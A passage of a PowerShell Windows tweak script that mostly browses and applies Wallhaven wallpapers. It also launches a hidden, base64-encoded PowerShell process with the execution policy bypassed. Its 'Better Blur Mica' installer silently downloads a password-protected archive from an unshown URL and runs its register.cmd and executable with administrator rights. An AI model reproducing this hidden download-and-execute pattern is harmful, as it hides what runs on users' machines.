    $folder=Join-Path $pictures 'Tufa7 Wallpaper'
    New-Item -ItemType Directory -Path $folder -Force|Out-Null
    return $folder
}

function Get-WallhavenTrendingPage {
    param([int]$Page=1)

    [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

    $base='https://wallhaven.cc/api/v1/search?categories=111&purity=100&ratios=landscape&page='+$Page

    try{
        return Invoke-RestMethod `
            -Uri ($base+'&sorting=hot') `
            -Headers @{'User-Agent'='CUTE-Ryoku/1.0'} `
            -ErrorAction Stop
    }
    catch{
        return Invoke-RestMethod `
            -Uri ($base+'&sorting=toplist&topRange=1M') `
            -Headers @{'User-Agent'='CUTE-Ryoku/1.0'} `
            -ErrorAction Stop
    }
}

function Get-CuteWallpaperThumb {
    param($Item)

    Ensure-Temp
    $dir=Join-Path $script:TempRoot 'wallhaven-thumbs'
    New-Item -ItemType Directory -Path $dir -Force|Out-Null

    $path=Join-Path $dir ($Item.id+'.jpg')

    if(Test-Path -LiteralPath $path){
        return $path
    }

    $url=[string]$Item.thumbs.large

    if([string]::IsNullOrWhiteSpace($url)){
        $url=[string]$Item.thumbs.original
    }

    Invoke-WebRequest `
        -Uri $url `
        -OutFile $path `
        -UseBasicParsing `
        -Headers @{'User-Agent'='CUTE-Ryoku/1.0'} `
        -ErrorAction Stop

    return $path
}

function Write-CuteAnsiWallpaperPreview {
    param([Parameter(Mandatory)][string]$Path)

    Enable-CuteVirtualTerminal
    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue

    $source=$null
    $bitmap=$null
    $graphics=$null

    try{
        $source=[System.Drawing.Image]::FromFile($Path)

        $consoleWidth=90
        $consoleHeight=30

        try{$consoleWidth=[Console]::WindowWidth}catch{}
        try{$consoleHeight=[Console]::WindowHeight}catch{}

        $maxWidth=[Math]::Max(36,$consoleWidth-7)
        $maxRows=[Math]::Max(10,$consoleHeight-13)

        $targetWidth=$maxWidth
        $targetPixelHeight=[int][Math]::Ceiling($targetWidth*($source.Height/[double]$source.Width))
        $targetRows=[int][Math]::Ceiling($targetPixelHeight/2.0)

        if($targetRows -gt $maxRows){
            $targetRows=$maxRows
            $targetPixelHeight=$targetRows*2
            $targetWidth=[int][Math]::Floor($targetPixelHeight*($source.Width/[double]$source.Height))
        }

        $targetWidth=[Math]::Max(28,[Math]::Min($maxWidth,$targetWidth))
        $targetRows=[Math]::Max(8,[Math]::Min($maxRows,$targetRows))
        $targetPixelHeight=$targetRows*2

        $bitmap=New-Object System.Drawing.Bitmap($targetWidth,$targetPixelHeight)
        $graphics=[System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.InterpolationMode=[System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
        $graphics.PixelOffsetMode=[System.Drawing.Drawing2D.PixelOffsetMode]::HighQuality
        $graphics.CompositingQuality=[System.Drawing.Drawing2D.CompositingQuality]::HighQuality

        $graphics.DrawImage($source,0,0,$targetWidth,$targetPixelHeight)

        $esc=[char]27

        for($y=0;$y -lt $targetPixelHeight;$y+=2){
            $sb=New-Object Text.StringBuilder
            [void]$sb.Append('   ')

            for($x=0;$x -lt $targetWidth;$x++){
                $top=$bitmap.GetPixel($x,$y)
                $bottom=$bitmap.GetPixel($x,[Math]::Min($y+1,$targetPixelHeight-1))

                [void]$sb.Append($esc)
                [void]$sb.Append('[38;2;')
                [void]$sb.Append($top.R)
                [void]$sb.Append(';')
                [void]$sb.Append($top.G)
                [void]$sb.Append(';')
                [void]$sb.Append($top.B)
                [void]$sb.Append('m')

                [void]$sb.Append($esc)
                [void]$sb.Append('[48;2;')
                [void]$sb.Append($bottom.R)
                [void]$sb.Append(';')
                [void]$sb.Append($bottom.G)
                [void]$sb.Append(';')
                [void]$sb.Append($bottom.B)
                [void]$sb.Append('m▀')
            }

            [void]$sb.Append($esc)
            [void]$sb.Append('[0m')
            [Console]::WriteLine($sb.ToString())
        }
    }
    finally{
        if($graphics){$graphics.Dispose()}
        if($bitmap){$bitmap.Dispose()}
        if($source){$source.Dispose()}
    }
}
function Save-CuteWallhavenWallpaper {
    param($Item)

    $folder=Get-CuteWallpaperFolder
    $url=[string]$Item.path

    $extension=[IO.Path]::GetExtension(([uri]$url).AbsolutePath)
    if([string]::IsNullOrWhiteSpace($extension)){
        $extension='.jpg'
    }

    $destination=Join-Path $folder ($Item.id+$extension)

    if(Test-Path -LiteralPath $destination){
        Show-OK ('Already saved: '+$destination)
        return $destination
    }

    Download-CuteFile `
        -Url $url `
        -Destination $destination `
        -Label ('Wallpaper '+$Item.id)

    Show-OK ('Saved: '+$destination)
    return $destination
}

function Test-Tufa7PhotosInstalled {
    try{
        return ($null -ne (Get-AppxPackage -Name 'Microsoft.Windows.Photos' -ErrorAction SilentlyContinue | Select-Object -First 1))
    }
    catch{return $false}
}

function Ensure-Tufa7PhotosApp {
    param([switch]$Quiet)

    if(Test-Tufa7PhotosInstalled){
        if(-not $Quiet){
            Show-OK 'Microsoft Photos is already installed.'
        }
        return
    }

    $winget=Get-WinGetPath

    if(-not $winget){
        if(-not (Repair-WinGet -Force)){
            throw 'WinGet is required to install Microsoft Photos.'
        }

        $winget=Get-WinGetPath
    }

    if(-not $winget){
        throw 'WinGet could not be started for Microsoft Photos.'
    }

    $args=@(
        'install',
        '--id','9WZDNCRFJBH4',
        '--source','msstore',
        '--exact',
        '--accept-package-agreements',
        '--accept-source-agreements',
        '--silent',
        '--disable-interactivity'
    )

    $p=Start-Process `
        -FilePath $winget `
        -ArgumentList $args `
        -PassThru `
        -WindowStyle Hidden

    $p.WaitForExit()
    $exit=$p.ExitCode

    if($exit -ne 0 -and -not (Test-Tufa7PhotosInstalled)){
        throw ('Microsoft Photos installation returned exit code '+$exit+'.')
    }

    for($i=0;$i -lt 30;$i++){
        if(Test-Tufa7PhotosInstalled){
            break
        }

        Start-Sleep -Milliseconds 500
    }

    if(-not (Test-Tufa7PhotosInstalled)){
        throw 'Microsoft Photos was not detected after installation.'
    }

    if(-not $Quiet){
        Show-OK 'Microsoft Photos installed.'
    }
}

function Get-Tufa7PhotosWindowProcesses {
    $result=@()
    foreach($name in @('Photos','Microsoft.Photos')){
        try{
            $result += @(Get-Process -Name $name -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 })
        }
        catch{}
    }
    return @($result)
}

function Wait-Tufa7PhotosViewerClosed {
    $detected=$false

    for($i=0;$i -lt 40;$i++){
        $windows=@(Get-Tufa7PhotosWindowProcesses)

        if($windows.Count -gt 0){
            $detected=$true
            break
        }

        Start-Sleep -Milliseconds 250
    }

    if($detected){
        while($true){
            $windows=@(Get-Tufa7PhotosWindowProcesses)

            if($windows.Count -eq 0){
                break
            }

            Start-Sleep -Milliseconds 350
        }
    }

    Start-Sleep -Seconds 10
}

function Get-Tufa7WallpaperSizeText {
    param($Item)

    try{
        $bytes=[long]$Item.file_size

        if($bytes -gt 0){
            return ((Format-MB $bytes)+' MB')
        }
    }
    catch{}

    return 'Unknown'
}

function Clear-Tufa7BufferedKeys {
    try{
        while([Console]::KeyAvailable){
            [void][Console]::ReadKey($true)
        }
    }
    catch{}
}

function Write-Tufa7WallpaperProgress {
    param(
        [Parameter(Mandatory)][int]$Top,
        [Parameter(Mandatory)][int]$Percent,
        [long]$Downloaded,
        [long]$Total,
        [string]$State='Downloading'
    )

    $Percent=[Math]::Max(0,[Math]::Min(100,$Percent))

    $width=22

    try{
        $consoleWidth=[Console]::WindowWidth
        $width=[Math]::Max(
            14,
            [Math]::Min(34,$consoleWidth-56)
        )
    }
    catch{}

    $filled=[int][Math]::Floor(($Percent/100.0)*$width)
    $bar=('█'*$filled)+('·'*($width-$filled))

    $sizeText=''

    if($Total -gt 0){
        $sizeText=(' {0}/{1} MB' -f (Format-MB $Downloaded),(Format-MB $Total))
    }
    elseif($Downloaded -gt 0){
        $sizeText=(' {0} MB' -f (Format-MB $Downloaded))
    }

    $line=('   [{0}] {1,3}%  {2}{3}' -f $bar,$Percent,$State,$sizeText)

    $consoleWidth=100

    try{
        $consoleWidth=[Math]::Max(48,[Console]::WindowWidth-1)
    }
    catch{}

    if($line.Length -gt $consoleWidth){
        $line=$line.Substring(0,$consoleWidth)
    }

    try{
        [Console]::SetCursorPosition(0,$Top)
    }
    catch{}

    Write-Host $line.PadRight($consoleWidth) -NoNewline -ForegroundColor Cyan
}

function Download-Tufa7WallpaperForViewer {
    param(
        [Parameter(Mandatory)][string]$Url,
        [Parameter(Mandatory)][string]$Destination,
        [Parameter(Mandatory)][int]$ProgressTop,
        [long]$ExpectedTotal=0
    )

    if(-not (Test-HttpUrl $Url)){
        throw 'Invalid wallpaper URL.'
    }

    [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

    $request=[System.Net.HttpWebRequest]::Create([Uri]$Url)
    $request.Method='GET'
    $request.UserAgent='Tufa7-Tweak-Wallpaper/8.7'
    $request.AllowAutoRedirect=$true
    $request.Timeout=45000
    $request.ReadWriteTimeout=45000

    $response=$null
    $input=$null
    $output=$null

    try{
        $response=$request.GetResponse()

        $total=[long]$response.ContentLength

        if($total -le 0 -and $ExpectedTotal -gt 0){
            $total=$ExpectedTotal
        }

        $input=$response.GetResponseStream()
        $output=[IO.File]::Open(
            $Destination,
            [IO.FileMode]::Create,
            [IO.FileAccess]::Write,
            [IO.FileShare]::None
        )

        $buffer=New-Object byte[] 65536
        [long]$downloaded=0
        $lastPercent=-1

        Write-Tufa7WallpaperProgress `
            -Top $ProgressTop `
            -Percent 0 `
            -Downloaded 0 `
            -Total $total `
            -State 'Downloading'

        while(($read=$input.Read($buffer,0,$buffer.Length)) -gt 0){
            $output.Write($buffer,0,$read)
            $downloaded+=$read

            $percent=0

            if($total -gt 0){
                $percent=[int][Math]::Floor(
                    ($downloaded*100.0)/$total
                )
            }

            if($percent -ne $lastPercent){
                Write-Tufa7WallpaperProgress `
                    -Top $ProgressTop `
                    -Percent $percent `
                    -Downloaded $downloaded `
                    -Total $total `
                    -State 'Downloading'

                $lastPercent=$percent
            }
        }

        if($total -le 0){
            $total=$downloaded
        }

        Write-Tufa7WallpaperProgress `
            -Top $ProgressTop `
            -Percent 100 `
            -Downloaded $downloaded `
            -Total $total `
            -State 'Opening Photos'

        return $downloaded
    }
    finally{
        if($output){$output.Dispose()}
        if($input){$input.Dispose()}
        if($response){$response.Dispose()}
    }
}

function Start-Tufa7WallpaperCleanupWorker {
    param(
        [Parameter(Mandatory)][string]$ImagePath,
        [Parameter(Mandatory)][string]$ViewDirectory
    )

    $worker=@'
param(
    [string]$ImagePath,
    [string]$ViewDirectory
)

$ErrorActionPreference='SilentlyContinue'

try{
    $viewerPath=$ImagePath.Replace('%','%25').Replace(' ','%20')
    $viewerUri='ms-photos:viewer?fileName='+$viewerPath

    Start-Process $viewerUri|Out-Null

    $detected=$false

    for($i=0;$i -lt 60;$i++){
        $photos=@()

        foreach($name in @('Photos','Microsoft.Photos')){
            $photos+=@(
                Get-Process -Name $name -ErrorAction SilentlyContinue|
                    Where-Object{$_.MainWindowHandle -ne 0}
            )
        }

        if($photos.Count -gt 0){
            $detected=$true
            break
        }

        Start-Sleep -Milliseconds 250
    }

    if($detected){
        $deadline=(Get-Date).AddHours(4)

        while((Get-Date) -lt $deadline){
            $photos=@()

            foreach($name in @('Photos','Microsoft.Photos')){
                $photos+=@(
                    Get-Process -Name $name -ErrorAction SilentlyContinue|
                        Where-Object{$_.MainWindowHandle -ne 0}
                )
            }

            if($photos.Count -eq 0){
                break
            }

            Start-Sleep -Milliseconds 400
        }
    }
    else{
        Start-Sleep -Seconds 60
    }

    Start-Sleep -Seconds 10
}
finally{
    for($i=0;$i -lt 20;$i++){
        try{
            if(Test-Path -LiteralPath $ImagePath){
                Remove-Item -LiteralPath $ImagePath -Force -ErrorAction Stop
            }

            break
        }
        catch{
            Start-Sleep -Milliseconds 500
        }
    }

    try{
        if(Test-Path -LiteralPath $ViewDirectory){
            $remaining=@(
                Get-ChildItem -LiteralPath $ViewDirectory -Force -ErrorAction SilentlyContinue
            )

            if($remaining.Count -eq 0){
                Remove-Item -LiteralPath $ViewDirectory -Force -ErrorAction SilentlyContinue
            }
        }
    }
    catch{}
}
'@

    $workerPath=Join-Path $script:TempRoot (
        'wallpaper-worker-'+[guid]::NewGuid().ToString('N')+'.ps1'
    )

    [IO.File]::WriteAllText(
        $workerPath,
        $worker,
        (New-Object Text.UTF8Encoding($true))
    )

    $escapedWorker=$workerPath.Replace('"','\"')
    $escapedImage=$ImagePath.Replace('"','\"')
    $escapedDir=$ViewDirectory.Replace('"','\"')

    $command='& "'+$escapedWorker+'" -ImagePath "'+$escapedImage+'" -ViewDirectory "'+$escapedDir+'"; Remove-Item -LiteralPath "'+$escapedWorker+'" -Force -ErrorAction SilentlyContinue'

    $encoded=[Convert]::ToBase64String(
        [Text.Encoding]::Unicode.GetBytes($command)
    )

    Start-Process `
        -FilePath powershell.exe `
        -ArgumentList @(
            '-NoLogo',
            '-NoProfile',
            '-WindowStyle','Hidden',
            '-ExecutionPolicy','Bypass',
            '-EncodedCommand',$encoded
        ) `
        -WindowStyle Hidden `
        -ErrorAction Stop |
        Out-Null
}

function Open-Tufa7WallpaperTempViewer {
    param(
        [Parameter(Mandatory)]$Item,
        [Parameter(Mandatory)][int]$ProgressTop
    )

    if($script:WallpaperViewBusy){
        return
    }

    $script:WallpaperViewBusy=$true

    try{
        Ensure-Temp
        Ensure-Tufa7PhotosApp -Quiet

        $viewDir=Join-Path $script:TempRoot 'wallpaper-view'
        New-Item -ItemType Directory -Path $viewDir -Force|Out-Null

        $url=[string]$Item.path
        $extension=[IO.Path]::GetExtension(([uri]$url).AbsolutePath)

        if([string]::IsNullOrWhiteSpace($extension)){
            $extension='.jpg'
        }

        $tempImage=Join-Path $viewDir (
            'Tufa7-'+$Item.id+'-'+[guid]::NewGuid().ToString('N')+$extension
        )

        [long]$expectedTotal=0

        try{
            $expectedTotal=[long]$Item.file_size
        }
        catch{}

        [void](Download-Tufa7WallpaperForViewer `
            -Url $url `
            -Destination $tempImage `
            -ProgressTop $ProgressTop `
            -ExpectedTotal $expectedTotal)

        Start-Tufa7WallpaperCleanupWorker `
            -ImagePath $tempImage `
            -ViewDirectory $viewDir

        Write-Tufa7WallpaperProgress `
            -Top $ProgressTop `
            -Percent 100 `
            -Downloaded $(if(Test-Path -LiteralPath $tempImage){(Get-Item -LiteralPath $tempImage).Length}else{$expectedTotal}) `
            -Total $(if($expectedTotal -gt 0){$expectedTotal}else{0}) `
            -State 'Opened'

        Write-CuteLog 'WALLPAPER' (
            'Full wallpaper opened: '+
            [string]$Item.id
        )
    }
    finally{
        $script:WallpaperViewBusy=$false
        Clear-Tufa7BufferedKeys
    }
}

function Initialize-CuteWallpaperNative {
    if('CuteWallpaperNative' -as [type]){return}

    Add-Type @'
using System;
using System.Runtime.InteropServices;

public static class CuteWallpaperNative
{
    [DllImport("user32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool SystemParametersInfo(
        int uAction,
        int uParam,
        string lpvParam,
        int fuWinIni
    );
}
'@
}

function Set-CuteDesktopWallpaper {
    param([Parameter(Mandatory)][string]$Path)

    if(-not (Test-Path -LiteralPath $Path)){
        throw 'Wallpaper file does not exist.'
    }

    $desktop='HKCU:\Control Panel\Desktop'
    Set-ItemProperty -Path $desktop -Name WallpaperStyle -Value '10' -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $desktop -Name TileWallpaper -Value '0' -ErrorAction SilentlyContinue

    Initialize-CuteWallpaperNative

    $ok=[CuteWallpaperNative]::SystemParametersInfo(
        20,
        0,
        $Path,
        3
    )

    if(-not $ok){
        throw 'Windows could not apply the wallpaper.'
    }

    Show-OK ('Wallpaper applied: '+[IO.Path]::GetFileName($Path))
}

function Select-CuteSavedWallpaper {
    param([object[]]$Saved)

    if(-not $Saved -or $Saved.Count -eq 0){
        Show-Warn 'Save at least one wallpaper with Space first.'
        Start-Sleep -Milliseconds 500
        return
    }

    $cursor=0

    Clear-Host
    CWrite ''
    Show-Section 'SAVED WALLPAPERS'
    CWrite '   [ UP ] / [ DOWN ] move   [ ENTER ] apply   [ Q ] continue browsing' DarkGray
    CWrite ''

    $listTop=[Console]::CursorTop
    $rows=[Math]::Max(3,$Saved.Count+1)

    while($true){
        Clear-CuteRows -Top $listTop -Count $rows

        for($i=0;$i -lt $Saved.Count;$i++){
            $name=[IO.Path]::GetFileName($Saved[$i].Path)

            if($i -eq $cursor){
                CWrite ('   > '+$name) Cyan
            }
            else{
                CWrite ('     '+$name) Gray
            }
        }

        $key=[Console]::ReadKey($true)

        switch($key.Key){
            'UpArrow'{
                $cursor--
                if($cursor -lt 0){$cursor=$Saved.Count-1}
            }

            'DownArrow'{
                $cursor++
                if($cursor -ge $Saved.Count){$cursor=0}
            }

            'Enter'{
                Set-CuteDesktopWallpaper -Path $Saved[$cursor].Path
                Start-Sleep -Milliseconds 500
                return
            }

            'Q'{return}
            'Escape'{return}
        }
    }
}

function Show-Tufa7WallpaperBrowser {
    $page=1
    $cursor=0
    $saved=@()
    $feed=$null

    Clear-Host
    CWrite ''
    Show-Section 'TUFA7 WALLPAPER'

    $contentTop=[Console]::CursorTop

    while($true){
        $clearRows=35

        try{
            $clearRows=[Math]::Max(
                12,
                [Console]::WindowHeight-$contentTop-1
            )
        }
        catch{}

        Clear-CuteRows -Top $contentTop -Count $clearRows

        if($null -eq $feed){
            CWrite ('   Loading Wallhaven trends - page '+$page+'...') DarkGray

            try{
                $feed=Get-WallhavenTrendingPage -Page $page
            }
            catch{
                Clear-CuteRows -Top $contentTop -Count $clearRows
                Show-ErrorText ('Wallhaven could not be loaded: '+$_.Exception.Message)
                Pause-Cute
                return
            }

            if(-not $feed.data -or $feed.data.Count -eq 0){
                Clear-CuteRows -Top $contentTop -Count $clearRows
                Show-Warn 'No wallpapers were returned.'
                Pause-Cute
                return
            }

            if($cursor -ge $feed.data.Count){
                $cursor=0
            }

            Clear-CuteRows -Top $contentTop -Count $clearRows
        }

        $item=$feed.data[$cursor]

        CWrite ('   Wallhaven trend   Page '+$page+'   '+($cursor+1)+'/'+$feed.data.Count) DarkGray
        CWrite ''

        try{
            $thumb=Get-CuteWallpaperThumb -Item $item
            Write-CuteAnsiWallpaperPreview -Path $thumb
        }
        catch{
            Show-Warn 'Preview could not be rendered; navigation still works.'
        }

        CWrite ''
        CWrite (
            '   '+
            $item.id+
            '   '+
            $item.resolution+
            '   '+
            $item.file_type+
            '   Original size: '+
            (Get-Tufa7WallpaperSizeText -Item $item)
        ) White

        $downloadRow=[Console]::CursorTop

        Write-Tufa7WallpaperProgress `
            -Top $downloadRow `
            -Percent 0 `
            -Downloaded 0 `
            -Total $(try{[long]$item.file_size}catch{0}) `
            -State 'Ready [ V ]'

        CWrite ''
        CWrite ''
        CWrite (
            '   Saved this session: '+
            $saved.Count+
            '   Folder: '+
            (Get-CuteWallpaperFolder)
        ) DarkGray

        CWrite ''
        CWrite '   [ LEFT ] / [ RIGHT ] browse   [ V ] full view   [ SPACE ] save   [ ENTER ] saved wallpapers' Cyan
        CWrite '   [ O ] Wallhaven page   [ R ] refresh   [ Q ] back' DarkGray

        $key=[Console]::ReadKey($true)

        switch($key.Key){
            'RightArrow'{
                if($script:WallpaperViewBusy){continue}

                $cursor++

                if($cursor -ge $feed.data.Count){
                    $page++
                    $cursor=0
                    $feed=$null
                }
            }

            'LeftArrow'{
                if($script:WallpaperViewBusy){continue}

                $cursor--

                if($cursor -lt 0){
                    if($page -gt 1){
                        $page--
                        $feed=$null
                        $cursor=0
                    }
                    else{
                        $cursor=0
                    }
                }
            }

            'Spacebar'{
                if($script:WallpaperViewBusy){continue}

                try{
                    $existing=$saved|
                        Where-Object{$_.Id -eq $item.id}|
                        Select-Object -First 1

                    if(-not $existing){
                        $path=Save-CuteWallhavenWallpaper -Item $item

                        $saved+=[pscustomobject]@{
                            Id=[string]$item.id
                            Path=$path
                        }
                    }
                }
                catch{
                    try{
                        Write-CuteLog 'WALLPAPER' ('Save failed: '+$_.Exception.Message)
                    }
                    catch{}
                }
            }

            'Enter'{
                if($script:WallpaperViewBusy){continue}

                Select-CuteSavedWallpaper -Saved $saved
                Clear-Host
                CWrite ''
                Show-Section 'TUFA7 WALLPAPER'
                $contentTop=[Console]::CursorTop
            }

            'V'{
                if($script:WallpaperViewBusy){
                    continue
                }

                try{
                    Open-Tufa7WallpaperTempViewer `
                        -Item $item `
                        -ProgressTop $downloadRow
                }
                catch{
                    try{
                        Write-Tufa7WallpaperProgress `
                            -Top $downloadRow `
                            -Percent 0 `
                            -Downloaded 0 `
                            -Total $(try{[long]$item.file_size}catch{0}) `
                            -State 'Failed'

                        Write-CuteLog 'WALLPAPER' (
                            'Full image viewer failed: '+
                            $_.Exception.Message
                        )
                    }
                    catch{}
                }
            }

            'O'{
                if($script:WallpaperViewBusy){continue}

                try{
                    Start-Process ([string]$item.url)|Out-Null
                }
                catch{}
            }

            'R'{
                if($script:WallpaperViewBusy){continue}
                $feed=$null
            }

            'Q'{
                if(-not $script:WallpaperViewBusy){
                    return
                }
            }

            'Escape'{
                if(-not $script:WallpaperViewBusy){
                    return
                }
            }
        }
    }
}

function Get-Tufa7PaidBbmRarExecutable {
    $candidates=@(
        (Join-Path $env:ProgramFiles 'WinRAR\Rar.exe'),
        $(if(${env:ProgramFiles(x86)}){Join-Path ${env:ProgramFiles(x86)} 'WinRAR\Rar.exe'}else{$null})
    )|Where-Object{
        $_ -and (Test-Path -LiteralPath $_)
    }

    return ($candidates|Select-Object -First 1)
}

function Test-Tufa7PaidBbmExtracted {
    param([Parameter(Mandatory)][string]$Destination)

    if(-not (Test-Path -LiteralPath $Destination)){
        return $false
    }

    $register=Get-ChildItem -LiteralPath $Destination -Filter 'register.cmd' -Recurse -File -ErrorAction SilentlyContinue|
        Select-Object -First 1

    $bbm=Get-ChildItem -LiteralPath $Destination -Filter 'BBM.exe' -Recurse -File -ErrorAction SilentlyContinue|
        Select-Object -First 1

    return ($null -ne $register -and $null -ne $bbm)
}

function Expand-Tufa7PaidBbmArchive {
    param(
        [Parameter(Mandatory)][string]$ArchivePath,
        [Parameter(Mandatory)][string]$Destination
    )

    $rar=Get-Tufa7PaidBbmRarExecutable

    if(-not $rar){
        throw 'WinRAR command-line component Rar.exe is required for this source package.'
    }

    $password=Get-Tufa7LegacyArchivePassword

    if([string]::IsNullOrWhiteSpace($password)){
        throw 'Better Blur Mica archive password is unavailable.'
    }

    if(Test-Path -LiteralPath $Destination){
        Remove-Item -LiteralPath $Destination -Recurse -Force -ErrorAction SilentlyContinue
    }

    New-Item -ItemType Directory -Path $Destination -Force|Out-Null

    $quotedArchive='"'+$ArchivePath.Replace('"','\"')+'"'
    $outputSwitch='-op'+$Destination
    $quotedOutput='"'+$outputSwitch.Replace('"','\"')+'"'
    $passwordSwitch='-p'+$password
    $quotedPassword='"'+$passwordSwitch.Replace('"','\"')+'"'

    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName=$rar
    $psi.Arguments='x -cfg- -y -o+ '+$quotedPassword+' '+$quotedOutput+' '+$quotedArchive
    $psi.UseShellExecute=$false
    $psi.CreateNoWindow=$true
    $psi.WindowStyle=[Diagnostics.ProcessWindowStyle]::Hidden
    $psi.RedirectStandardInput=$true
    $psi.RedirectStandardOutput=$true
    $psi.RedirectStandardError=$true

    Write-CuteLog 'BBM' 'Extracting the source package with Rar.exe. Password arguments are hidden from the log.'

    $proc=New-Object System.Diagnostics.Process
    $proc.StartInfo=$psi

    try{
        if(-not $proc.Start()){
            throw 'Rar.exe could not be started.'
        }

        try{$proc.StandardInput.Close()}catch{}

        $outTask=$proc.StandardOutput.ReadToEndAsync()
        $errTask=$proc.StandardError.ReadToEndAsync()

        if(-not $proc.WaitForExit(30000)){
            try{$proc.Kill()}catch{}
            try{$proc.WaitForExit(2000)|Out-Null}catch{}
            throw 'Better Blur Mica archive extraction timed out.'
        }

        $proc.WaitForExit()

        $stdout=''
        $stderr=''

        try{$stdout=$outTask.Result}catch{}
        try{$stderr=$errTask.Result}catch{}

        Write-CuteLog 'BBM' ('Rar.exe ExitCode: '+$proc.ExitCode)

        if(-not [string]::IsNullOrWhiteSpace([string]$stdout)){
            Write-CuteLog 'BBM-OUT' (([string]$stdout).Trim())
        }

        if(-not [string]::IsNullOrWhiteSpace([string]$stderr)){
            Write-CuteLog 'BBM-ERR' (([string]$stderr).Trim())
        }

        if(-not (Test-Tufa7PaidBbmExtracted -Destination $Destination)){
            throw ('Better Blur Mica package extraction did not produce register.cmd and BBM.exe. Rar.exe exit code: '+$proc.ExitCode)
        }
    }
    finally{
        $proc.Dispose()
        $password=$null
        $passwordSwitch=$null
        $quotedPassword=$null
    }
}

function Install-Tufa7PaidBbm {
    Assert-Administrator 'Better Blur Mica'
    Ensure-Temp

    $url=Get-Tufa7PaidBbmUrl

    if(-not (Test-HttpUrl $url)){
        throw 'Better Blur Mica source is unavailable.'
    }

    $runId=[guid]::NewGuid().ToString('N')
    $archiveFile=Join-Path $script:TempRoot ('Release-'+$runId+'.rar')
    $extract=Join-Path $script:TempRoot ('BBM-Extract-'+$runId)
    $destination=Join-Path $env:ProgramFiles 'Release'

    try{
        Show-Info 'Downloading Better Blur Mica source package...'
        Download-CuteFile -Url $url -Destination $archiveFile -Label 'Better Blur Mica'

        Expand-Tufa7PaidBbmArchive -ArchivePath $archiveFile -Destination $extract

        $register=Get-ChildItem -LiteralPath $extract -Filter 'register.cmd' -Recurse -File -ErrorAction SilentlyContinue|
            Select-Object -First 1

        $bbm=Get-ChildItem -LiteralPath $extract -Filter 'BBM.exe' -Recurse -File -ErrorAction SilentlyContinue|
            Select-Object -First 1

        if(-not $register){
            throw 'register.cmd was not found in the Better Blur Mica package.'
        }

        if(-not $bbm){
            throw 'BBM.exe was not found in the Better Blur Mica package.'
        }

        $sourceDir=$register.Directory.FullName

        if($bbm.Directory.FullName -ne $sourceDir){
            $inside=Get-ChildItem -LiteralPath $sourceDir -Filter 'BBM.exe' -Recurse -File -ErrorAction SilentlyContinue|
                Select-Object -First 1

            if(-not $inside){
                throw 'BBM.exe is not inside the Better Blur Mica release directory.'
            }
        }

        $explorerStopped=$false

        try{
            if(Test-Path -LiteralPath $destination){
                $oldUninstall=Join-Path $destination 'uninstall.cmd'

                if(Test-Path -LiteralPath $oldUninstall){
                    try{
                        Invoke-Tufa7CmdHidden `
                            -CommandPath $oldUninstall `
                            -WorkingDirectory $destination `
                            -TimeoutMs 20000
                    }
                    catch{
                        Show-Warn ('Previous Better Blur Mica registration could not be fully removed: '+$_.Exception.Message)
                    }
                }

                Stop-Process -Name 'BBM' -Force -ErrorAction SilentlyContinue

                for($attempt=0;$attempt -lt 20;$attempt++){
                    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
                    $explorerStopped=$true
                    Start-Sleep -Milliseconds 200

                    try{
                        Remove-Item -LiteralPath $destination -Recurse -Force -ErrorAction Stop
                    }
                    catch{}

                    if(-not (Test-Path -LiteralPath $destination)){
                        break
                    }
                }

                if(Test-Path -LiteralPath $destination){
                    throw 'Previous Better Blur Mica files are still locked. Restart Windows and try again.'
                }
            }

            New-Item -ItemType Directory -Path $destination -Force|Out-Null
            Copy-Item -Path (Join-Path $sourceDir '*') -Destination $destination -Recurse -Force -ErrorAction Stop

            $registerPath=Join-Path $destination 'register.cmd'
            $bbmPath=Join-Path $destination 'BBM.exe'

            if(-not (Test-Path -LiteralPath $registerPath)){
                throw 'register.cmd is missing after Better Blur Mica installation.'
            }

            if(-not (Test-Path -LiteralPath $bbmPath)){
                throw 'BBM.exe is missing after Better Blur Mica installation.'
            }

            Show-Info 'Registering Better Blur Mica...'
            Invoke-Tufa7CmdHidden -CommandPath $registerPath -WorkingDirectory $destination -TimeoutMs 30000

            Show-Info 'Launching Better Blur Mica...'
            Start-Process -FilePath $bbmPath -WorkingDirectory $destination|Out-Null

            Show-OK 'Better Blur Mica installed and launched.'
        }
        finally{
            if($explorerStopped -or -not (Get-Process explorer -ErrorAction SilentlyContinue)){
                Start-Sleep -Milliseconds 350
                Start-Process explorer.exe -ErrorAction SilentlyContinue|Out-Null
            }
        }
    }
    finally{
        Remove-Item -LiteralPath $archiveFile -Force -ErrorAction SilentlyContinue
        Remove-Item -LiteralPath $extract -Recurse -Force -ErrorAction SilentlyContinue
    }
}


function Invoke-Tufa7CmdHidden {
    param(
        [Parameter(Mandatory)][string]$CommandPath,
        [Parameter(Mandatory)][string]$WorkingDirectory,
        [int]$TimeoutMs=30000
    )

    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName=$env:ComSpec
    $psi.WorkingDirectory=$WorkingDirectory
    $psi.Arguments='/d /s /c ""'+$CommandPath+'""'
    $psi.UseShellExecute=$false
    $psi.CreateNoWindow=$true
    $psi.WindowStyle=[Diagnostics.ProcessWindowStyle]::Hidden
    $psi.RedirectStandardOutput=$true
    $psi.RedirectStandardError=$true

    $proc=New-Object System.Diagnostics.Process
    $proc.StartInfo=$psi

    try{
        if(-not $proc.Start()){
            throw ([IO.Path]::GetFileName($CommandPath)+' could not be started.')
        }

        $outTask=$proc.StandardOutput.ReadToEndAsync()
        $errTask=$proc.StandardError.ReadToEndAsync()

        if(-not $proc.WaitForExit($TimeoutMs)){
            try{$proc.Kill()}catch{}
            throw ([IO.Path]::GetFileName($CommandPath)+' timed out.')
        }

        $proc.WaitForExit()

        if($proc.ExitCode -ne 0){
            $errorText=''
            try{$errorText=([string]$errTask.Result).Trim()}catch{}

            if([string]::IsNullOrWhiteSpace($errorText)){
                throw ([IO.Path]::GetFileName($CommandPath)+' returned exit code '+$proc.ExitCode+'.')
            }

